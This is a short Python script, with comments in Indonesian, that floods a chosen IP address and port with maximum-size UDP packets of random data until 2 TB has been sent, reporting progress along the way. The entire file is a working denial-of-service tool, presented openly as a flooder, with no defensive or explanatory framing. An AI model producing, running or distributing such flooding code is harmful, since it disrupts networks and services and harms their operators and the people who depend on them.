#!/usr/bin/python3
import socket
import random
import sys
import time

if len(sys.argv) != 3:
    sys.exit('Usage: python3 f.py <target_ip> <target_port>')

# Parameter
target_ip = sys.argv[1]
target_port = int(sys.argv[2])
packet_size = 65507  # Ukuran maksimum paket UDP (65,535 - header 8 byte UDP dan 20 byte IP)
total_data = 2 * 1024 * 1024 * 1024 * 1024  # 2TB dalam bytes
total_packets = total_data // packet_size  # Total paket

print(f"Flooding target: {target_ip}:{target_port or 'random'} with 2TB data")
print(f"Packet size: {packet_size} bytes | Total packets: {total_packets}")

# Membuat socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(packet_size)

sent_packets = 0  # Hitung jumlah paket yang dikirim
start_time = time.time()

while sent_packets < total_packets:
    try:
        sock.sendto(bytes, (target_ip, target_port))
        sent_packets += 1

        # Tampilkan progres setiap 10 juta paket
        if sent_packets % 10_000_000 == 0:
            elapsed_time = time.time() - start_time
            gb_sent = (sent_packets * packet_size) / (1024 ** 3)
            print(f"Sent: {sent_packets}/{total_packets} packets ({gb_sent:.2f} GB) in {elapsed_time:.2f} seconds")
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        break
    except Exception as e:
        print(f"Error: {e}")
        break

print("DONE - 2TB Data Sent")
